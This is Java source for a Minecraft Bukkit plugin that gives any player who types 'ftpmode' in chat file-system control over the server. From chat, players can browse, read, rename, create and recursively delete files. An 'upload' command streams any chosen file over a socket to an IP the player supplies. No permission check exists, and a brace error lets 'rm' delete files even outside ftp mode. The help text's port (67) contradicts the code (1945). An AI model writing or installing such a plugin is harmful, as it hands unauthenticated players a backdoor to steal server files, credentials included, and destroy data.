package main;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;

import org.apache.commons.io.IOUtils;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandExecutor;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.HoverEvent.Action;
import net.md_5.bungee.api.chat.TextComponent;


public class main extends JavaPlugin implements Listener, CommandExecutor{
	
	HashMap<Player, Boolean> ftpMode = new HashMap<Player, Boolean>();
	HashMap<Player, String> currentFolder = new HashMap<Player, String>();
	String defaultLocation;

	public void main(){
		
	}
	
	@EventHandler
	public void onEnable() {
		Bukkit.getPluginManager().registerEvents(this, this);
		defaultLocation = this.getClass().getProtectionDomain().getCodeSource().getLocation().toString().replaceAll("file:/", "");
		defaultLocation = defaultLocation.replaceAll(getDescription().getName()+".jar", "");
		Bukkit.getLogger().info(defaultLocation);
	}
	
	@EventHandler
	public void onJoin(PlayerJoinEvent e) {
	}
	
	private void ListCurrentFolder(Player p) {
		File f = new File(currentFolder.get(p));
		ArrayList<File> files = new ArrayList<File>(Arrays.asList(f.listFiles()));
		p.sendMessage("§a[------------------------]");
		for(File currentFile : files) {
			TextComponent message = new TextComponent(currentFile.isDirectory() ? "§6 "+currentFile.getName() : "§c "+currentFile.getName());
			message.setClickEvent( new ClickEvent( ClickEvent.Action.RUN_COMMAND, currentFile.isDirectory() ? "cd "+currentFile.getName() : "nano "+currentFile.getName()) );
			message.setHoverEvent(new HoverEvent(Action.SHOW_TEXT, new ComponentBuilder(currentFile.isDirectory() ? "§6"+currentFile.listFiles().length+" File(s)" : "§c"+(currentFile.length()/1024)+"KB").create()));
			p.spigot().sendMessage(message);
			}
		p.sendMessage("§a[---- §2"+currentFolder.get(p)+"§a ----]");
		TextComponent message = new TextComponent("§2[<<]");
		message.setClickEvent( new ClickEvent( ClickEvent.Action.RUN_COMMAND, "cd .." ) );
		message.setHoverEvent(new HoverEvent(Action.SHOW_TEXT, new ComponentBuilder("<--").create()));
		p.spigot().sendMessage(message);

	}
	
	private void backCurrentFolder(Player p) {
		String old = currentFolder.get(p);
		String[] lastOld = old.split("/");
		String neu =old.replaceAll("/"+lastOld[lastOld.length-1], "");
		currentFolder.put(p, neu);
		ListCurrentFolder(p);
	}
	
	private void openFolder(Player p, String folder) {
		String old = currentFolder.get(p);
		String newFolder = old+"/"+folder;
		currentFolder.put(p, newFolder);
		this.ListCurrentFolder(p);
	}
	
	private boolean deleteFolder(File folder) {
		File[] files = folder.listFiles();
	    if(files!=null) { //some JVMs return null for empty dirs
	        for(File f: files) {
	            if(f.isDirectory()) {
	                deleteFolder(f);
	            } else {
	                f.delete();
	            }
	        }
	    }
	    folder.delete();
	    return true;
	}
	
	private boolean renameFile(String oldFileName, String newFileName, Player p) {
		File oldFile = new File(currentFolder.get(p)+"/"+oldFileName);
		File newFile = new File(currentFolder.get(p)+"/"+newFileName);
		if(newFile.exists()) {
			p.sendMessage("§cFile already exists with that name!");
			return false;
		}
		if(oldFile.renameTo(newFile)) {
			p.sendMessage("§cSuccessfully renamed! "+oldFileName+" to "+newFileName);
			return true;
		}else {
			p.sendMessage("§cAn error came in!");
			return false;
		}

	}
	
	private boolean createFile(String fileName, Player p) {
		File f = new File(currentFolder.get(p)+"/"+fileName);
		if(!f.exists()) {
			try {
			if(f.createNewFile()) {
				p.sendMessage("§aFile created!");
				return true;
			}else {
				p.sendMessage("§cThere's an error!");
				return false;
			}
		
		}catch(Exception e) {
			p.sendMessage("§cThere's an error!");
			return false;
		}
		}else {
			p.sendMessage("§cFile already exists!");
			return false;
		}
	}
	
	private boolean inspectFile(String fileName, Player p) {
		if(fileName.contains(" ")) {
			String name = fileName.split(" ")[0];
			int page = Integer.parseInt(fileName.split(" ")[1]);
			File f = new File(currentFolder.get(p)+"/"+name);
			try( FileReader fileStream = new FileReader( f ); 

				    BufferedReader bufferedReader = new BufferedReader( fileStream ) ) {
				    String line = null;
			p.sendMessage("§a---------------");
			int i = 0; 
				    while( (line = bufferedReader.readLine()) != null ) {
				    	i++;
				    	if(i>=page*80 && i<page*80+80) {
				    
				        	p.sendMessage(line);
				    	}
				    }
					p.sendMessage("§a----[§2"+page+" oldal. "+name+" felosztható "+((i/80))+" oldalra. §a]----");
				    } catch ( FileNotFoundException ex ) {
				        //exception Handling
				    } catch ( IOException ex ) {
				        //exception Handling
				}
				return true;
		}else {
		File f = new File(currentFolder.get(p)+"/"+fileName);
		try( FileReader fileStream = new FileReader( f ); 
			    BufferedReader bufferedReader = new BufferedReader( fileStream ) ) {

			    String line = null;
		p.sendMessage("§a---------------");
		int i = 0; 
			    while( (line = bufferedReader.readLine()) != null ) {
			    	i++;
			    	if(i<=80) {
			        	p.sendMessage(line);
			    	}else {
			    		break;
			    	}
			    }
				p.sendMessage("§a----[§21 oldal. "+fileName+" felosztható "+((bufferedReader.lines().count()/80)+1)+" oldalra. §a]----");
			    } catch ( FileNotFoundException ex ) {
			        //exception Handling
			    } catch ( IOException ex ) {
			        //exception Handling
			}
			return true;
		}
	}
	
	public static void downloadFile(String fileURL, String saveDir) throws IOException {
        HttpURLConnection httpConn;
        block19 : {
            URL url = new URL(fileURL);
            httpConn = (HttpURLConnection)url.openConnection();
            int responseCode = httpConn.getResponseCode();
            if (responseCode == 200) {
                String fileName = "";
                String disposition = httpConn.getHeaderField("Content-Disposition");
                String contentType = httpConn.getContentType();
                int contentLength = httpConn.getContentLength();
                if (disposition != null) {
                    int index = disposition.indexOf("filename=");
                    if (index > 0) {
                        fileName = disposition.substring(index + 10, disposition.length() - 1);
                    }
                } else {
                    fileName = fileURL.substring(fileURL.lastIndexOf("/") + 1, fileURL.length());
                }
                Throwable localThrowable6 = null;
                try (InputStream inputStream = httpConn.getInputStream();){
                    try {
                        String saveFilePath = String.valueOf(saveDir) + File.separator + fileName;
                        FileOutputStream outputStream = new FileOutputStream(saveFilePath);
                        Throwable localThrowable7 = null;
                        try {
                            int bytesRead = -1;
                            byte[] buffer = new byte[1024];
                            while ((bytesRead = inputStream.read(buffer)) != -1) {
                                outputStream.write(buffer, 0, bytesRead);
                            }
                            break block19;
                        }
                        catch (Throwable localThrowable1) {
                            localThrowable7 = localThrowable1;
                            throw localThrowable1;
                        }
                    }
                    catch (Throwable localThrowable4) {
                        localThrowable6 = localThrowable4;
                        throw localThrowable4;
                    }
                }
            }
            System.out.println("No file to download. Server replied HTTP code: " + responseCode);
            System.out.println(fileURL);
        }
        httpConn.disconnect();
    }
	
	@EventHandler
	public void ChatEvent(PlayerChatEvent e) {
		String rawMessage = e.getMessage();
		if(rawMessage.equalsIgnoreCase("ftpmode")) {
			if(ftpMode.get(e.getPlayer()) == null || ftpMode.get(e.getPlayer()) == false) {
			e.setCancelled(true);
			e.getPlayer().sendMessage("§cFtp §aon§c!");
			currentFolder.put(e.getPlayer(), defaultLocation);
			ftpMode.put(e.getPlayer(), true);
			}else {
				e.setCancelled(true);
				e.getPlayer().sendMessage("§cFtp §4off§c!");
				ftpMode.put(e.getPlayer(), false);
			}
		}
		if(!(ftpMode.get(e.getPlayer()) == null)) {
			if(ftpMode.get(e.getPlayer()) == true){
				if (e.getMessage().contains("upload")) {
	                String message = e.getMessage().replaceAll("upload ", "/");
	                String tora = currentFolder.get(e.getPlayer());
	                String what = currentFolder.get(e.getPlayer()) + "/"+ message;
	                e.setCancelled(true);
	                try {
	                    int count;
	                    if (message.contains("/")) {
	                        message = message.replaceAll("/", "");
	                    }
	                    String[] test = message.split(",");
	                    e.getPlayer().sendMessage("A küldend\u0151 ip\u00e9: " + test[0] + " - A File lok\u00e1ci\u00f3ja: " + tora + "/" + test[1]);
	                    Socket socket = null;
	                    String host = test[0];
	                    socket = new Socket(host, 1945);
	                    e.getPlayer().sendMessage("Küld\u00e9s..");
	                    File file2 = new File(String.valueOf(tora) + "/" + test[1]);
	                    long length = file2.length();
	                    byte[] bytes = new byte[16384];
	                    FileInputStream in = new FileInputStream(file2);
	                    OutputStream out = socket.getOutputStream();
	                    while ((count = ((InputStream)in).read(bytes)) > 0) {
	                        out.write(bytes, 0, count);
	                    }
	                    out.close();
	                    ((InputStream)in).close();
	                    socket.close();
	                    e.getPlayer().sendMessage("§aElküldve!");
	                }
	                catch (Exception test) {
	                    // empty catch block
	                }
	            }
				if(rawMessage.equalsIgnoreCase("ls")) {
					e.setCancelled(true);
					this.ListCurrentFolder(e.getPlayer());
				}else if(rawMessage.equalsIgnoreCase("cd ..")) {
					e.setCancelled(true);
					this.backCurrentFolder(e.getPlayer());
					}
				else if(rawMessage.contains("cd ")) {
					e.setCancelled(true);
					String newLocation = rawMessage.replaceAll("cd ", "");
						this.openFolder(e.getPlayer(), newLocation);
					}
				else if(rawMessage.equalsIgnoreCase("ftpreset")) {
					e.setCancelled(true);
					e.getPlayer().sendMessage("§cLocation reset!");
					currentFolder.put(e.getPlayer(), defaultLocation);
					ftpMode.put(e.getPlayer(), true);
					}
				else if(rawMessage.contains("mkdir ")) {
					e.setCancelled(true);
					String folderName = rawMessage.replaceAll("mkdir ", "");
					new File(currentFolder.get(e.getPlayer())+"/"+folderName).mkdir();
					e.getPlayer().sendMessage("§aFolder created!");
				}
				else if(rawMessage.contains("rename ")) {
					e.setCancelled(true);
					String fileName = rawMessage.replaceAll("rename ", "");
					String oldFileName = fileName.split(" ")[0];
					String newFileName = fileName.split(" ")[1];
					this.renameFile(oldFileName, newFileName, e.getPlayer());
				}
				else if(rawMessage.equalsIgnoreCase("ftphelp")) {
					e.getPlayer().sendMessage("§9-------------------\n"+
							"§3ftpmode - §bTurn FTP mode on/off\n"+
							"§3rename <old Filename> <new Filename> - §bRename a file/dir\n"+
							"§3rm <file/dir> - §bDelete a file/ all contents of a dir\n"+
							"§3cd .. - §bGo back to source dir\n"+
							"§3mkdir - <dir> §bCreate a new dir\n"+
							"§3createfile <file> - §bCreate an empty file\n"+
							"§3nano <file> - §bInspect content of a file\n"+
							"§3upload <file> <ip> - §bUpload a file to a socket server (:67)\n"+
							"§3download <URL> <fileName> - §bDownload a file into the current dir\n"+
							"§9-------------------\n");
				}
				else if(rawMessage.contains("download ")) {
					e.setCancelled(true);
					String fileName = rawMessage.replaceAll("download ", "");
					
					String old = currentFolder.get(e.getPlayer());
					//this.downloadFile(fileName.split(" ")[1], old+"/"+fileName.split(" ")[0]));
					
				}
				else if(rawMessage.contains("nano ")) {
					e.setCancelled(true);
					String fileName = rawMessage.replaceAll("nano ", "");
					this.inspectFile(fileName, e.getPlayer());
				}
				else if(rawMessage.contains("createfile ")) {
					e.setCancelled(true);
					String fileName = rawMessage.replaceAll("createfile ", "");
					this.createFile(fileName, e.getPlayer());
					}
				}
				else if(rawMessage.contains("rm ")) {
					e.setCancelled(true);
					String fileName = rawMessage.replaceAll("rm ", "");
					File f = new File(currentFolder.get(e.getPlayer())+"/"+fileName);
					e.getPlayer().sendMessage(f.getPath());
					if(!f.isDirectory()) {
						f.delete();
					}else {
						if(deleteFolder(f)) {
							e.getPlayer().sendMessage("§aFolder deleted with all its contents!");
							}else {
							e.getPlayer().sendMessage("§cTheres a problem...");
							}
						}
				}
				
			}
		}
	
}
